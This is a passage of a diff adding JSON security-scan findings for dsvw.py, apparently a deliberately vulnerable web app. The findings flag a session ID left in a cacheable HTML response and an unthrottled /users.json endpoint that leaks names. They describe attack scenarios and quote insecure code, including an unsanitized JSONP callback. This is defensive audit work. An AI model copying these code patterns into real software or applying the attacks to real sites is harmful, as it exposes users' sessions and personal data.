+          "proof": "SOURCE: On line 68, a freshly generated SESSIONID is embedded directly into the HTML response body via `<meta http-equiv=\"Set-Cookie\" content=\"SESSIONID=%s; path=/\">` after successful login. SINK: The response handler at lines 75-80 emits the response with only `Connection: close` and `Content-Type` headers \u2014 no `Cache-Control`, `Pragma`, or `Expires` header is set. Since the Content-Type is `text/html`, the page is cacheable by default. An attacker who gains access to a shared machine's browser cache, a corporate proxy cache, or a CDN cache can retrieve the stored HTML page and extract the SESSIONID from the response body. This is orthogonal to CWE-614 (missing Secure/HttpOnly cookie flags) and CWE-613 (insufficient session expiration) \u2014 it addresses the token being present in a cacheable response body rather than only in a `Set-Cookie` header."
+        }
+      }
+    },
+    {
+      "check_id": "twin-round/CWE-770",
+      "path": "dsvw.py",
+      "start": {
+        "line": 65
+      },
+      "end": {
+        "line": 65
+      },
+      "extra": {
+        "message": "Missing Rate Limiting on /users.json \u2014 Bulk User Enumeration",
+        "severity": "high",
+        "metadata": {
+          "cwe": [
+            "CWE-770"
+          ],
+          "citation": "content = \"%s%s%s\" % (\"\" if not \"callback\" in params else \"%s(\" % params[\"callback\"], json.dumps(dict((_.findtext(\"username\"), _.findtext(\"surname\")) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall(\"user\"))), \"\" if not \"callback\" in params else \")\")",
+          "proof": "SOURCE: The `/users.json` endpoint at lines 64-65 returns a JSON dict of all usernames and surnames from the hardcoded USERS_XML with NO authentication (already documented as CWE-200) and with NO rate limiting, throttling, or incremental backoff of any kind. SINK: An attacker can script repeated GET requests to `/users.json` at arbitrary frequency to bulk-scrape the full user directory (admin, dricci, amason, svargas and their surnames) without triggering any lockout or slowdown. While CWE-307 covers missing rate limiting on the `/login` path and CWE-799 covers missing rate limiting on the `/?comment=X` path, this endpoint represents a third unthrottled flow that leaks PII (real names + usernames) at unlimited speed."
+        }
+      }
+    }
+  ]
+}
